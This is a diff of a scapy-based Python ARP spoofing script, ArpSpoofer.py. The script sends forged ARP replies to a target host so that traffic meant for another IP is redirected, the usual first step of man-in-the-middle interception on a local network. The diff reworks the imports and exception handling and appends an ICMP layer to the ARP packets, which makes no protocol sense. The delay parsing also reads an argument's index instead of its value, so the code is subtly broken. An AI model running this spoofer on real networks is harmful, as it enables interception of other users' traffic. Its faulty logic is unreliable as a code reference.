@@ -1,4 +1,6 @@
-import scapy.all as scapy
+from scapy.layers.inet import ICMP
+from scapy.layers.l2 import Ether, ARP
+from scapy.all import srp, send
 import sys
 import time
 
@@ -20,13 +22,14 @@ help_msg = "usage:\n     python ArpSpoofer.py [-h] [-i IFACE] [-s SRC] [-d DELAY
 
 
 def get_mac(ip):
-    arp_request_broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(pdst=ip)
+    global target_mac
+    arp_request_broadcast = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip) / ICMP()
     answered_list = []
     try:
         if interface is not None:
-            answered_list = scapy.srp(arp_request_broadcast, timeout=5, verbose=False, interface=interface)[0]
+            answered_list = srp(arp_request_broadcast, timeout=5, verbose=False, interface=interface)[0]
         else:
-            answered_list = scapy.srp(arp_request_broadcast, timeout=5, verbose=False)[0]
+            answered_list = srp(arp_request_broadcast, timeout=5, verbose=False)[0]
     except:
         print("interface is unavailable")
     try:
@@ -36,13 +39,13 @@ def get_mac(ip):
 
 
 def spoof(target_ip, spoof_ip):
-    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac,
-                       psrc=spoof_ip)
+    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac,
+                       psrc=spoof_ip) / ICMP()
     try:
         if interface is not None:
-            scapy.send(packet, verbose=False, iface=interface)
+            send(packet, verbose=False, iface=interface)
         else:
-            scapy.send(packet, verbose=False)
+            send(packet, verbose=False)
     except:
         print("interface is unavailable")
 
@@ -73,22 +76,22 @@ if __name__ == "__main__":
         if "-t" in sys.argv or "--target" in sys.argv:
             try:
                 target_ip = sys.argv[sys.argv.index("-t") + 1]
-            except:
+            except ValueError:
                 target_ip = sys.argv[sys.argv.index("--target") + 1]
         if "-d" in sys.argv or "--delay" in sys.argv:
             try:
                 delay = int(sys.argv.index("-d"))
-            except:
+            except ValueError:
                 delay = int(sys.argv.index("--delay"))
         if "-s" in sys.argv or "--src" in sys.argv:
             try:
                 spoof_ip = sys.argv[sys.argv.index("-s") + 1]
-            except:
+            except ValueError:
                 spoof_ip = sys.argv[sys.argv.index("--src") + 1]
         if "-i" in sys.argv or "--iface" in sys.argv:
             try:
                 interface = sys.argv[sys.argv.index("-i") + 1]
-            except:
+            except ValueError:
                 interface = sys.argv[sys.argv.index("--iface") + 1]
 
     main()
